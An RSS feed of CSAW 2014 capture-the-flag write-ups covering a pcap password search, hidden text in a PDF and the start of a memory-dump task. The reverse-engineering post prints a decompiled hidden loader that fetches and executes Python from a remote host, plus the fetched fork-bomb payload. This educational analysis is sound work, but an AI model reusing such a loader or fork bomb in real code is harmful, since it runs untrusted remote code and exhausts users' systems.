<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>High Bytes by bt3gl</title><link>http://bt3gl.github.io/</link><description></description><atom:link href="http://bt3gl.github.io/feeds/infosec.rss.xml" rel="self"></atom:link><lastBuildDate>Mon, 22 Sep 2014 09:20:00 -0400</lastBuildDate><item><title>Reverse Engineering-100: eggshells</title><link>http://bt3gl.github.io/reverse-engineering-100-eggshells.html</link><description>&lt;p&gt;This is the first exploitation problem and it starts with the following text:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I trust people on the internet all the time, do you?&lt;/p&gt;
&lt;p&gt;Written by ColdHeat&lt;/p&gt;
&lt;p&gt;eggshells-master.zip&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Unzipping and Analyzing the Files&lt;/h2&gt;
&lt;p&gt;Let’s unzip the provided zip file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;unzip eggshells-master.zip
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This creates a directory called &lt;em&gt;eggshells-master&lt;/em&gt; that contains several &lt;em&gt;Python&lt;/em&gt; and &lt;em&gt;exe&lt;/em&gt; files. Let us look closer to the contend of this folder:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;tree .
├── capstone.py
├── distorm.py
├── interpreter.py
├── main.py
├── nasm
│   ├── LICENSE
│   ├── nasm.exe
│   ├── ndisasm.exe
│   └── rdoff
│       ├── ldrdf.exe
│       ├── rdf2bin.exe
│       ├── rdf2com.exe
│       ├── rdf2ihx.exe
│       ├── rdf2ith.exe
│       ├── rdf2srec.exe
│       ├── rdfdump.exe
│       ├── rdflib.exe
│       └── rdx.exe
├── nasm.py
├── server.py
├── shellcode.py
├── utils.pyc
└── wrapper.py
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Do you see anything unusual?&lt;/p&gt;
&lt;h2&gt;Decompiled a pre-compiled Python File&lt;/h2&gt;
&lt;p&gt;A pre-compiled Python file stands out in this list: &lt;em&gt;utils.pyc&lt;/em&gt;. We need to decompile it. For this task we use  &lt;a href="https://github.com/gstarnberger/uncompyle"&gt;uncompyle2&lt;/a&gt;, which can be installed with:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;sudo pip install uncompyle2
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let's learn a bit more about this tool with &lt;code&gt;uncompyle2 --help&lt;/code&gt;. The usage is straightfoward, but it's a good knowledge to learn about the &lt;em&gt;-o&lt;/em&gt; flag, which will decompile to a &lt;em&gt;.dis&lt;/em&gt; file instead of &lt;em&gt;stdout&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;Usage: uncompyle2 &lt;span class="o"&gt;[&lt;/span&gt;OPTIONS&lt;span class="o"&gt;]&lt;/span&gt;... &lt;span class="o"&gt;[&lt;/span&gt; FILE | DIR&lt;span class="o"&gt;]&lt;/span&gt;...

Examples:
  uncompyle2      foo.pyc bar.pyc       &lt;span class="c"&gt;# decompile foo.pyc, bar.pyc to stdout&lt;/span&gt;
  uncompyle2 -o . foo.pyc bar.pyc       &lt;span class="c"&gt;# decompile to ./foo.dis and ./bar.dis&lt;/span&gt;
  uncompyle2 -o /tmp /usr/lib/python1.5 &lt;span class="c"&gt;# decompile whole library&lt;/span&gt;

Options:
  -o &amp;lt;path&amp;gt;     output decompiled files to this path:
                &lt;span class="k"&gt;if &lt;/span&gt;multiple input files are decompiled, the common prefix
                is stripped from these names and the remainder appended to
                &amp;lt;path&amp;gt;
                  uncompyle -o /tmp bla/fasel.pyc bla/foo.pyc
                    -&amp;gt; /tmp/fasel.dis, /tmp/foo.dis
                  uncompyle -o /tmp bla/fasel.pyc bar/foo.pyc
                    -&amp;gt; /tmp/bla/fasel.dis, /tmp/bar/foo.dis
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We could also use &lt;em&gt;.py&lt;/em&gt; extension if we like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;  --py          use &lt;span class="s1"&gt;&amp;#39;.py&amp;#39;&lt;/span&gt; extension &lt;span class="k"&gt;for &lt;/span&gt;generated files
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Also, we learn about all the possible outputs:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt; Extensions of generated files:
  &lt;span class="s1"&gt;&amp;#39;.pyc_dis&amp;#39;&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.pyo_dis&amp;#39;&lt;/span&gt;   successfully decompiled &lt;span class="o"&gt;(&lt;/span&gt;and verified &lt;span class="k"&gt;if&lt;/span&gt; --verify&lt;span class="o"&gt;)&lt;/span&gt;
  &lt;span class="s1"&gt;&amp;#39;.py&amp;#39;&lt;/span&gt;                   with --py option
    + &lt;span class="s1"&gt;&amp;#39;_unverified&amp;#39;&lt;/span&gt;       successfully decompile but --verify failed
    + &lt;span class="s1"&gt;&amp;#39;_failed&amp;#39;&lt;/span&gt;           uncompyle failed &lt;span class="o"&gt;(&lt;/span&gt;contact author &lt;span class="k"&gt;for &lt;/span&gt;enhancement&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;All right, no more diverging. Let's play! We run the &lt;code&gt;uncompyle2&lt;/code&gt; command and obtain the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;uncompyle2 utils.pyc
&lt;span class="c"&gt;#Embedded file name: /Users/kchung/Desktop/CSAW Quals 2014/rev100/utils.py&lt;/span&gt;
&lt;span class="nb"&gt;exec &lt;/span&gt;__import__&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;urllib2&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;.urlopen&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://kchung.co/lol.py&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;.read&lt;span class="o"&gt;()&lt;/span&gt;
+++ okay decompyling utils.pyc 
&lt;span class="c"&gt;# decompiled 1 files: 1 okay, 0 failed, 0 verify failed&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Parsing the Result and Voilà&lt;/h2&gt;
&lt;p&gt;So all that this file does is in this line:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;exec&lt;/span&gt; &lt;span class="nb"&gt;__import__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;urllib2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urlopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;http://kchung.co/lol.py&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;To understand this code, we need to know that Python's &lt;a href="https://docs.python.org/2/reference/simple_stmts.html#exec"&gt;exec&lt;/a&gt; method performs dynamic execution of code.  In this problem, &lt;em&gt;exec&lt;/em&gt; starts importing &lt;a href="https://docs.python.org/2/library/urllib2.html#module-urllib2"&gt;urllib2&lt;/a&gt;, which is a library for opening URLs.  It has the method &lt;a href="https://docs.python.org/2/library/urllib2.html#urllib2.urlopen"&gt;urlopen()&lt;/a&gt; to open the URL url, which can be either a string or a request object. This function returns a file-like object with three additional methods. Finally, &lt;a href="http://www.tutorialspoint.com/python/file_read.htm"&gt;read()&lt;/a&gt; would read this returned file.&lt;/p&gt;
&lt;p&gt;So all that this script does is to try running a Python file that is hosted online! 
Well, let's see what this file does! Let's just &lt;em&gt;curl&lt;/em&gt; &lt;a href="http://kchung.co/lol.py"&gt;http://kchung.co/lol.py&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt; curl http://kchung.co/lol.py
import os
&lt;span class="k"&gt;while &lt;/span&gt;True:
    try:
        os.fork&lt;span class="o"&gt;()&lt;/span&gt;
    except:
        os.system&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;start&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="c"&gt;# flag{trust_is_risky}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Yaaay! The flag is &lt;strong&gt;trust_is_risky&lt;/strong&gt;! Easy!&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Hack all the things!&lt;/strong&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">bt3gl</dc:creator><pubDate>Mon, 22 Sep 2014 09:20:00 -0400</pubDate><guid>tag:bt3gl.github.io,2014-09-22:reverse-engineering-100-eggshells.html</guid><category>CTF</category><category>CSAW</category><category>Reverse Engineering</category></item><item><title>Networking-100: Big Data</title><link>http://bt3gl.github.io/networking-100-big-data.html</link><description>&lt;p&gt;This is the only networking problem, and it is only 100 points, so it turned out to be very easy.&lt;/p&gt;
&lt;p&gt;The problem starts with the following text:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Something, something, data, something, something, big&lt;/p&gt;
&lt;p&gt;Written by HockeyInJune&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/ctfs/write-ups/blob/master/csaw-ctf-2014/big-data/pcap.pcapng"&gt;pcap.pcapng&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;Inspecting the Wireshark File&lt;/h2&gt;
&lt;p&gt;The file extension &lt;a href="https://appliance.cloudshark.org/blog/5-reasons-to-move-to-pcapng/"&gt;.pcapng&lt;/a&gt; correspond to files for &lt;em&gt;packet capture&lt;/em&gt;. They usually contain a dump of data packets captured over a network. This type of files holds blocks or data, and they can be used to rebuild captured packets into recognizable data. &lt;/p&gt;
&lt;p&gt;We can open this file with &lt;a href="https://www.wireshark.org/"&gt;Wireshark&lt;/a&gt;, which is an open-source packet analyzer, or using &lt;a href="http://chaosreader.sourceforge.net/"&gt;chaosreader&lt;/a&gt;, a freeware tool to trace TCP and UDP sessions. We choose the first. There are several things that we could explore and look for in this file:
- We could search for all the the interesting protocols inside and analyse them. 
- We could go to &lt;em&gt;Statistics&lt;/em&gt;-&amp;gt; &lt;em&gt;Protocol Hierarchy&lt;/em&gt; and look at the traffic patterns.
- We could search in packet bytes, looking for specific strings such as login or password. 
- We could try to find something interesting in &lt;em&gt;Conversations&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Searching for the String &lt;em&gt;Password&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;It turned out that all we need was to look for the string &lt;em&gt;password&lt;/em&gt;. To do this we followed these steps in Wireshark:
 1. Go to &lt;em&gt;Edit&lt;/em&gt;
 2. Go to &lt;em&gt;Find Packet&lt;/em&gt;
 3. Search for &lt;strong&gt;password&lt;/strong&gt; choosing the options &lt;em&gt;string&lt;/em&gt; and &lt;em&gt;packet bytes&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Yay! We found something over a &lt;strong&gt;telnet&lt;/strong&gt; protocol:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/mUN4b1n.png" /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Following the TCP Stream&lt;/h2&gt;
&lt;p&gt;Now, all we need to do is to right-click in the line and choose &lt;em&gt;Follow TCP Stream&lt;/em&gt;. This  returns:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;.....&lt;/span&gt; &lt;span class="p"&gt;.....&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;...........&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="p"&gt;.....&lt;/span&gt; &lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="p"&gt;..............&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt; &lt;span class="p"&gt;.....&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;.............&lt;/span&gt;&lt;span class="n"&gt;P&lt;/span&gt;&lt;span class="p"&gt;......&lt;/span&gt; &lt;span class="mf"&gt;.38400&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mf"&gt;38400.&lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;.......&lt;/span&gt;&lt;span class="n"&gt;XTERM&lt;/span&gt;&lt;span class="p"&gt;.......&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;.....!.....&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;.....&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;............&lt;/span&gt;
&lt;span class="n"&gt;Linux&lt;/span&gt; &lt;span class="mf"&gt;3.13.0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;generic&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ubuntu&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pts&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="n"&gt;ubuntu&lt;/span&gt; &lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ju&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ul&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;li&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ia&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;an&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;
&lt;span class="p"&gt;.&lt;/span&gt;
&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="n"&gt;Password&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;bigdataisaproblemnotasolution&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;.&lt;/span&gt;
&lt;span class="p"&gt;.&lt;/span&gt;
&lt;span class="n"&gt;Login&lt;/span&gt; &lt;span class="n"&gt;incorrect&lt;/span&gt;
&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="n"&gt;ubuntu&lt;/span&gt; &lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And we find our flag: &lt;strong&gt;bigdataisaproblemnotasolution&lt;/strong&gt;!&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Hack all the things!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Edited: If you had decided to use &lt;em&gt;chaosreader&lt;/em&gt; to process the pcapng file instead, the solution &lt;a href="http://evandrix.github.io/ctf/2014-csaw-networking-100-bigdata.html"&gt;from this write-up&lt;/a&gt; is also cool:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;for &lt;/span&gt;f in pcap.pcapng-chaosreader/*.html; &lt;span class="k"&gt;do &lt;/span&gt;cat &lt;span class="s2"&gt;&amp;quot;${f}&amp;quot;&lt;/span&gt; | w3m -dump -T text/html &lt;span class="s2"&gt;&amp;quot;${f}&amp;quot;&lt;/span&gt;; &lt;span class="k"&gt;done&lt;/span&gt; | egrep &lt;span class="s2"&gt;&amp;quot;flag{&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">bt3gl</dc:creator><pubDate>Mon, 22 Sep 2014 08:20:00 -0400</pubDate><guid>tag:bt3gl.github.io,2014-09-22:networking-100-big-data.html</guid><category>CTF</category><category>CSAW</category><category>Networking</category></item><item><title>Forensics-200: Obscurity</title><link>http://bt3gl.github.io/forensics-200-obscurity.html</link><description>&lt;p&gt;The third forensics problem starts with the following text:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;see or do not see&lt;/p&gt;
&lt;p&gt;Written by marc&lt;/p&gt;
&lt;p&gt;&lt;a href="https://ctf.isis.poly.edu/static/uploads/883c7046854e04138c55680ffde90a61/pdf.pdf"&gt;pdf.pdf&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Hacking PDFs, what fun!  &lt;/p&gt;
&lt;p&gt;In general, when dealing with reverse-engineering malicious documents, we follow these steps:
   1. We search for malicious embedded code (shell code, JavaScript).
   2. We extract any suspicious code segments
   3. If we see shell code, we disassemble or debug it. If we see JavaScript (or ActionScript or VB macro code), we try to examine it.&lt;/p&gt;
&lt;p&gt;However, this problem turned out to be very simple...&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Finding the Flag in 10 Seconds&lt;/h2&gt;
&lt;p&gt;Yeap, this easy:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="n"&gt;Download&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;PDF&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
&lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="n"&gt;Open&lt;/span&gt; &lt;span class="n"&gt;it&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt; &lt;span class="n"&gt;any&lt;/span&gt; &lt;span class="n"&gt;PDF&lt;/span&gt; &lt;span class="n"&gt;viewer&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
&lt;span class="mf"&gt;3.&lt;/span&gt; &lt;span class="n"&gt;CTRL&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;select&lt;/span&gt; &lt;span class="n"&gt;all&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;contend&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="mf"&gt;4.&lt;/span&gt; &lt;span class="n"&gt;You&lt;/span&gt; &lt;span class="n"&gt;see&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/b03EehK.png" /&gt;&lt;/p&gt;
&lt;p&gt;OK, we were luck. Keep reading if you think this was too easy.&lt;/p&gt;
&lt;h2&gt;Analysing the ID and the Streams in a PDF File&lt;/h2&gt;
&lt;p&gt;Let's suppose we had no clue that the flag would just be a text in the file. In this case, we would want to examine the file's structure. For this task we use the &lt;a href="http://blog.didierstevens.com/programs/pdf-tools/"&gt;PDF Tool&lt;/a&gt; suite, which is written in Python. &lt;/p&gt;
&lt;h4&gt;pdfid&lt;/h4&gt;
&lt;p&gt;We start with &lt;em&gt;pdfid.py&lt;/em&gt;, which parses the PDF  looking for certain  keywords. We download and unzip that script, and then we make it an executable:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;unzip pdfid_v0_1_2.zip 
&lt;span class="nv"&gt;$ &lt;/span&gt;chmod a+x pdfid.py 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Running over our file gives:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./pdfid.py pdf.pdf 
PDFiD 0.1.2 pdf.pdf
 PDF Header: %PDF-1.3
 obj                   20
 endobj                19
 stream                10
 endstream             10
 xref                   1
 trailer                1
 startxref              1
 /Page                  1
 /Encrypt               0
 /ObjStm                0
 /JS                    0
 /JavaScript            0
 /AA                    0
 /OpenAction            0
 /AcroForm              0
 /JBIG2Decode           0
 /RichMedia             0
 /Launch                0
 /EmbeddedFile          0
 /XFA                   0
 /Colors &amp;gt; 2^24         0
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;All right, no funny stuff going on here. We need to look deeper into each of the these streams.&lt;/p&gt;
&lt;h4&gt;pdf-parser&lt;/h4&gt;
&lt;p&gt;We download &lt;em&gt;pdf-parser.py&lt;/em&gt;, which is used to search for all the fundamental elements in a PDF file. Let's take a closer look:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;unzip pdf-parser_V0_4_3.zip
&lt;span class="nv"&gt;$ &lt;/span&gt;chmod a+x pdf-parser.py
&lt;span class="nv"&gt;$ &lt;/span&gt;./pdf-parser.py 
Usage: pdf-parser.py &lt;span class="o"&gt;[&lt;/span&gt;options&lt;span class="o"&gt;]&lt;/span&gt; pdf-file|zip-file|url
pdf-parser, use it to parse a PDF document

Options:
  --version             show program&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s version number and &lt;span class="nb"&gt;exit&lt;/span&gt;
  -s SEARCH, --search&lt;span class="o"&gt;=&lt;/span&gt;SEARCH
                        string to search in indirect objects &lt;span class="o"&gt;(&lt;/span&gt;except streams&lt;span class="o"&gt;)&lt;/span&gt;
  -f, --filter          pass stream object through filters &lt;span class="o"&gt;(&lt;/span&gt;FlateDecode,
                        ASCIIHexDecode, ASCII85Decode, LZWDecode and
                        RunLengthDecode only&lt;span class="o"&gt;)&lt;/span&gt;
  -o OBJECT, --object&lt;span class="o"&gt;=&lt;/span&gt;OBJECT
                        id of indirect object to &lt;span class="k"&gt;select&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;version independent&lt;span class="o"&gt;)&lt;/span&gt;
  -r REFERENCE, --reference&lt;span class="o"&gt;=&lt;/span&gt;REFERENCE
                        id of indirect object being referenced &lt;span class="o"&gt;(&lt;/span&gt;version
                        independent&lt;span class="o"&gt;)&lt;/span&gt;
  -e ELEMENTS, --elements&lt;span class="o"&gt;=&lt;/span&gt;ELEMENTS
                        &lt;span class="nb"&gt;type &lt;/span&gt;of elements to &lt;span class="k"&gt;select&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;cxtsi&lt;span class="o"&gt;)&lt;/span&gt;
  -w, --raw             raw output &lt;span class="k"&gt;for &lt;/span&gt;data and filters
  -a, --stats           display stats &lt;span class="k"&gt;for &lt;/span&gt;pdf document
  -t TYPE, --type&lt;span class="o"&gt;=&lt;/span&gt;TYPE  &lt;span class="nb"&gt;type &lt;/span&gt;of indirect object to &lt;span class="k"&gt;select&lt;/span&gt;
  -v, --verbose         display malformed PDF elements
  -x EXTRACT, --extract&lt;span class="o"&gt;=&lt;/span&gt;EXTRACT
                        filename to extract malformed content to
  -H, --hash            display &lt;span class="nb"&gt;hash &lt;/span&gt;of objects
  -n, --nocanonicalizedoutput
                        &lt;span class="k"&gt;do &lt;/span&gt;not canonicalize the output
  -d DUMP, --dump&lt;span class="o"&gt;=&lt;/span&gt;DUMP  filename to dump stream content to
  -D, --debug           display debug info
  -c, --content         display the content &lt;span class="k"&gt;for &lt;/span&gt;objects without streams or
                        with streams without filters
  --searchstream&lt;span class="o"&gt;=&lt;/span&gt;SEARCHSTREAM
                        string to search in streams
  --unfiltered          search in unfiltered streams
  --casesensitive       &lt;span class="k"&gt;case &lt;/span&gt;sensitive search in streams
  --regex               use regex to search in streams
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Very interesting! We run it with our file, searching for the string &lt;em&gt;/ProcSet&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./pdf-parser.py  pdf.pdf | grep  /ProcSet
        /ProcSet &lt;span class="o"&gt;[&lt;/span&gt; /ImageC /Text /PDF /ImageI /ImageB &lt;span class="o"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Awesome! Even though we don't see any text in the file (when we opened it in the PDF viewer), there is text somewhere!&lt;/p&gt;
&lt;h2&gt;Getting Text from PDF&lt;/h2&gt;
&lt;p&gt;A good way to extract text from a pdf is using &lt;a href="http://en.wikipedia.org/wiki/Pdftotext"&gt;pdftotext&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;pdftotext pdf.pdf
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You should get a &lt;code&gt;pdf.txt&lt;/code&gt; file. Reading it with Linux's commands &lt;code&gt;cat&lt;/code&gt; or &lt;code&gt;strings&lt;/code&gt;gives you the flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;strings pdf.txt 
flag&lt;span class="o"&gt;{&lt;/span&gt;security_through_obscurity&lt;span class="o"&gt;}&lt;/span&gt;    
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;As a note, there are several other PDF forensics tools that are worth to be mentioned: &lt;a href="http://esec-lab.sogeti.com/pages/Origami"&gt;Origami&lt;/a&gt; (pdfextract extracts JavaScript from PDF files), &lt;a href="http://blog.zeltser.com/post/3235995383/pdf-stream-dumper-malicious-file-analysis"&gt;PDF Stream Dumper&lt;/a&gt; (several PDF analysis tools), &lt;a href="http://blog.zeltser.com/post/6780160077/peepdf-malicious-pdf-analysis"&gt;Peepdf&lt;/a&gt; (command-line shell for examining PDF), &lt;a href="https://github.com/9b/pdfxray_lite"&gt;PDF X-RAY Lite&lt;/a&gt; (creates an HTML report with decoded file structure and contents), &lt;a href="http://blog.zeltser.com/post/12615013257/extracting-swf-from-pdf-using-swf-mastah"&gt;SWF mastah&lt;/a&gt; (extracts SWF objects), &lt;a href="for examining and decoding structure and content of PDF files"&gt;Pyew&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Hack all the things!&lt;/strong&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">bt3gl</dc:creator><pubDate>Mon, 22 Sep 2014 07:20:00 -0400</pubDate><guid>tag:bt3gl.github.io,2014-09-22:forensics-200-obscurity.html</guid><category>CTF</category><category>CSAW</category><category>Forensics</category></item><item><title>Forensics-100: dumpster diving</title><link>http://bt3gl.github.io/forensics-100-dumpster-diving.html</link><description>&lt;p&gt;This is the first forensic problem, and it is only 100 points. The problem starts with the following text:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;dumpsters are cool, but cores are cooler&lt;/p&gt;
&lt;p&gt;Written by marc&lt;/p&gt;
&lt;p&gt;&lt;a href="https://ctf.isis.poly.edu/static/uploads/606580b079e73e14ab2751e35d22ad44/firefox.mem.zip"&gt;firefox.mem.zip&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;Unziping firefox.mem.zip&lt;/h2&gt;
&lt;p&gt;The given file has a funny extension &lt;em&gt;.mem.zip&lt;/em&gt;. Before we go ahead and unzip it, let's try to learn more about this file. To do this we choose to use the Linux's command &lt;a href="http://en.wikipedia.org/wiki/File_(command)"&gt;file&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;file --help
Usage: file &lt;span class="o"&gt;[&lt;/span&gt;OPTION...&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;FILE...&lt;span class="o"&gt;]&lt;/span&gt;
Determine &lt;span class="nb"&gt;type &lt;/span&gt;of FILEs.

